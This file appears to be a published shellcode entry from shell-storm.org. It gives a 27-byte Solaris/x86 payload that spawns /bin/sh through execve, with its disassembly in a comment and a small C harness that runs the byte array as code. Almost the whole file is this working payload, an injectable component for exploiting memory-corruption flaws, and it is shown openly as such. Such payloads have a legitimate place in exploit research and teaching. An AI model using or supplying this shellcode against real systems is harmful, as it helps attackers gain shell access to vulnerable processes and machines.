/*
Title: 	 Solaris/x86 - execve("/bin/sh","/bin/sh",NULL) - 27 bytes
Author:  Jonathan Salwan <submit AT shell-storm.org>
Web:	 http://www.shell-storm.org
Twitter: http://twitter.com/jonathansalwan

Date:	 2010-05-19
Tested:  SunOS opensolaris 5.11 snv_111b i86pc i386 i86pc Solaris

section .text
    0x8048074:              31 c0              xorl   %eax,%eax
    0x8048076:              50                 pushl  %eax
    0x8048077:              68 6e 2f 73 68     pushl  $0x68732f6e
    0x804807c:              68 2f 2f 62 69     pushl  $0x69622f2f
    0x8048081:              89 e3              movl   %esp,%ebx
    0x8048083:              50                 pushl  %eax
    0x8048084:              53                 pushl  %ebx
    0x8048085:              89 e2              movl   %esp,%edx
    0x8048087:              50                 pushl  %eax
    0x8048088:              52                 pushl  %edx
    0x8048089:              53                 pushl  %ebx
    0x804808a:              b0 3b              movb   $0x3b,%al
    0x804808c:              50                 pushl  %eax
    0x804808d:              cd 91              int    $0x91

*/


#include <stdio.h>

char sc[] = "\x31\xc0\x50\x68\x6e\x2f"
	    "\x73\x68\x68\x2f\x2f\x62"
	    "\x69\x89\xe3\x50\x53\x89"
	    "\xe2\x50\x52\x53\xb0\x3b"
	    "\x50\xcd\x91";

int main(void)
{
       	fprintf(stdout,"Length: %d\n",strlen(sc));
	(*(void(*)()) sc)();

return 0;
}